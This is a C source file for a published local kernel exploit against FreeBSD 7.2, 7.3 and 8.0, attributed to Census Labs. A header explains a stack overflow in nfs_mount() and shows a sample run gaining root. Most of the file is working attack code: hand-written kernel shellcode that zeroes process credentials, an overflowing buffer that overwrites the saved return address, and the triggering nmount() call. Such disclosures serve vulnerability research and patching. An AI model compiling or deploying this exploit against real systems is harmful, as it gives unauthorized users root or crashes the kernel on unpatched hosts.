/*
 * nfs_mount_ex.c -- Patroklos Argyroudis, argp at domain census-labs.com
 *
 * Local kernel exploit for FreeBSD 8.0, 7.3 and 7.2.
 *
 * FreeBSD 8.0-RELEASE: Local kernel crash/denial-of-service.
 * FreeBSD 7.3/7.2-RELEASE: Local privilege escalation.
 * 
 * Discovered and exploited by Patroklos (argp) Argyroudis.
 *
 * The vulnerability is in nfs_mount() which is reachable by the mount(2)
 * and nmount(2) system calls.  In order for them to be enabled for
 * unprivileged users the sysctl(8) variable vfs.usermount must be set to a
 * non-zero value.
 *
 * nfs_mount() employs an insufficient input validation method for copying
 * data passed in the struct nfs_args from userspace to kernel.
 * Specifically, the file handle to be mounted (nfs_args.fh) and its size
 * (nfs_args.fhsize) are completely user-controllable.  In file
 * sys/nfsclient/nfs_vfsops.c from 8.0-RELEASE:
 *
 * 1094      if (!has_fh_opt) {
 * 1095            error = copyin((caddr_t)args.fh, (caddr_t)nfh,
 * 1096                 args.fhsize);
 * 1097          if (error) {
 * 1098               goto out;
 * 1099            }
 *
 * The above can cause a kernel stack overflow which leads to privilege
 * escalation in 7.3-RELEASE and 7.2-RELEASE, and a kernel crash /
 * denial-of-service in 8.0-RELEASE (due to SSP/ProPolice).  7.1-RELEASE
 * and earlier do not seem to be vulnerable since the bug was introduced in
 * 7.2-RELEASE.
 *
 * Sample run:
 *
 * [argp@julius ~]$ uname -rsi
 * FreeBSD 7.3-RELEASE GENERIC
 * [argp@julius ~]$ sysctl vfs.usermount
 * vfs.usermount: 1
 * [argp@julius ~]$ id
 * uid=1001(argp) gid=1001(argp) groups=1001(argp)
 * [argp@julius ~]$ gcc -Wall nfs_mount_ex.c -o nfs_mount_ex
 * [argp@julius ~]$ ./nfs_mount_ex 
 * [*] calling nmount()
 * [!] nmount error: -1030740736
 * nmount: Unknown error: -1030740736
 * [argp@julius ~]$ id
 * uid=0(root) gid=0(wheel) egid=1001(argp) groups=1001(argp)
 *
 * $Id: nfs_mount_ex.c,v c1302ea1317d 2010/05/23 17:30:17 argp $
 */

#include <sys/param.h>
#include <sys/mount.h>
#include <sys/uio.h>
#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sysexits.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <errno.h>
#include <nfsclient/nfsargs.h>

#define BUFSIZE     272

#define FSNAME      "nfs"
#define DIRPATH     "/tmp/nfs"

unsigned char kernelcode[] =
"\x64\xa1\x00\x00\x00\x00"      /* movl  %fs:0, %eax */
"\x8b\x40\x04"                  /* movl  0x4(%eax), %eax */
"\x8b\x40\x30"                  /* movl  0x30(%eax),%eax */
"\x31\xc9"                      /* xorl  %ecx, %ecx */
"\x89\x48\x04"                  /* movl  %ecx, 0x4(%eax) */
"\x89\x48\x08"                  /* movl  %ecx, 0x8(%eax) */
"\x81\xc4\xb0\x01\x00\x00"      /* addl  $0x1b0, %esp */
"\x5b"                          /* popl  %ebx */
"\x5e"                          /* popl  %esi */
"\x5f"                          /* popl  %edi */
"\x5d"                          /* popl  %ebp */
"\xc3";                         /* ret */

int
main()
{
    char *ptr;
    long *lptr;
    struct nfs_args na;
    struct iovec iov[6];

    na.version = 3;
    na.fh = calloc(BUFSIZE, sizeof(char));

    if(na.fh == NULL)
    {
        perror("calloc");
        exit(1);
    }

    memset(na.fh, 0x41, BUFSIZE);
    na.fhsize = BUFSIZE;

    ptr = (char *)na.fh;
    lptr = (long *)(na.fh + BUFSIZE - 8);
    
    *lptr++ = 0x12345678;       /* saved %ebp */
    *lptr++ = (u_long)ptr;      /* saved %eip */

    memcpy(ptr, kernelcode, (sizeof(kernelcode) - 1));

    mkdir(DIRPATH, 0700);

    iov[0].iov_base = "fstype";
    iov[0].iov_len = strlen(iov[0].iov_base) + 1;
    
    iov[1].iov_base = FSNAME;
    iov[1].iov_len = strlen(iov[1].iov_base) + 1;
    
    iov[2].iov_base = "fspath";
    iov[2].iov_len = strlen(iov[2].iov_base) + 1;
    
    iov[3].iov_base = DIRPATH;
    iov[3].iov_len = strlen(iov[3].iov_base) + 1;

    iov[4].iov_base = "nfs_args";
    iov[4].iov_len = strlen(iov[4].iov_base) + 1;

    iov[5].iov_base = &na;
    iov[5].iov_len = sizeof(na);

    printf("[*] calling nmount()\n");

    if(nmount(iov, 6, 0) < 0)
    {
        fprintf(stderr, "[!] nmount error: %d\n", errno);
        perror("nmount");
        rmdir(DIRPATH);
        free(na.fh);
        exit(1);
    }

    printf("[*] unmounting and deleting %s\n", DIRPATH);

    unmount(DIRPATH, 0);
    rmdir(DIRPATH);
    free(na.fh);

    return 0;
}

/* EOF */
